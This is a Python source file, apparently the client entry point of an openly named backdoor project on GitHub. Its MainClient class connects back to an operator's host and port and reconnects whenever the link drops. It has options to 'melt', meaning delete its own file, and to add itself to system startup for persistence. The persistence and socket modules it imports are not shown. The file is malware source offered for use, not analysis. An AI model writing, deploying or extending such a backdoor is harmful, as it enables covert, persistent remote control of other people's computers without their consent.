"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import socket
import os
import sys

# append path, needed for all 'main' files
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

from src.args import Args
from src import errors
from src.client import persistence
from src.client.socket import Socket
from src import logger


class MainClient:
    def __init__(self, host, port, is_host_name=False, add_to_startup=False, melt=False):
        os.chdir(os.path.dirname(os.path.abspath(__file__)))  # make sure working dir is same as file dir

        self._args = Args(self)
        logger.init(self._args.get_args())

        self.socket = None

        if is_host_name:
            self.host = socket.gethostbyname(host)
        else:
            self.host = host

        self.host = host
        self.port = port

        if melt:
            persistence.melt()

        if add_to_startup:
            try:
                persistence.add_startup()
            except errors.ClientSocket.Persistence.StartupError:
                pass

    def start(self):
        self.socket = Socket(self.host, self.port)

        try:
            self.socket.connect()
        except socket.error:  # if the server closes without warning
            self.socket.close()
            del self.socket
            self.start()


if __name__ == "__main__": 
    MainClient('127.0.0.1', 3000).start()
